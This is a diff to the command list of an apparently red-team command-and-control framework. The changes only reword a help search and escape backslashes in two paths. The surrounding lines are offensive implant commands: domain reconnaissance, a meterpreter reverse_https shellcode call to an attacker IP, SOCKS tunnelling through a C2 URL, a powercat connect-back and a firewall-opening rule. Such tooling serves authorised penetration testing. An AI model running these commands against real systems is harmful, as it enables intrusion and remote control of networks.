@@ -30,7 +30,7 @@ kill-implant
 hide-implant
 unhide-implant
 help
-searchhelp mimikatz
+searchhelp persistence
 back
 label-implant <newlabel>
 linuxprivchecker
@@ -114,7 +114,7 @@ run-exe SharpView.Program SharpView Get-DomainController -Domain blorebank.local
 run-exe SharpView.Program SharpView Get-DomainUser -LDAPFilter samaccountname=ben -Properties samaccountname,mail
 run-exe SharpView.Program SharpView Get-DomainUser -AdminCount -Properties samaccountname
 run-exe SharpView.Program SharpView Get-DomainComputer -LDAPFilter operatingsystem=*2012* -Properties samaccountname
-run-exe SharpView.Program Sharpview Find-InterestingFile -Path c:\users\ -Include *exe*
+run-exe SharpView.Program Sharpview Find-InterestingFile -Path c:\\users\\ -Include *exe*
 run-exe SharpView.Program SharpView Find-InterestingDomainShareFile -ComputerName SERVER01
 
 Bloodhound:
@@ -362,7 +362,7 @@ invoke-shellcode -payload windows/meterpreter/reverse_https -lhost 172.16.0.100 
 get-eventlog -newest 10000 -instanceid 4624 -logname security | select message -expandproperty message | select-string -pattern "user1|user2|user3"
 send-mailmessage -to "itdept@test.com" -from "user01 <user01@example.com>" -subject <> -smtpserver <> -attachment <>
 sharpsocks -uri http://www.c2.com:9090 -beacon 2000 -insecure
-netsh advfirewall firewall add rule name="Open Port 80" dir=in action=allow program="C:\windows\system32\svchost.exe" protocol=TCP localport=80 profile=Domain
+netsh advfirewall firewall add rule name="Open Port 80" dir=in action=allow program="C:\\windows\\system32\\svchost.exe" protocol=TCP localport=80 profile=Domain
 $socket = new-object System.Net.Sockets.TcpListener('0.0.0.0', 1080);$socket.start();
 reversedns 10.0.0.1
 powercat -c 172.0.0.1 -p 8080 -d
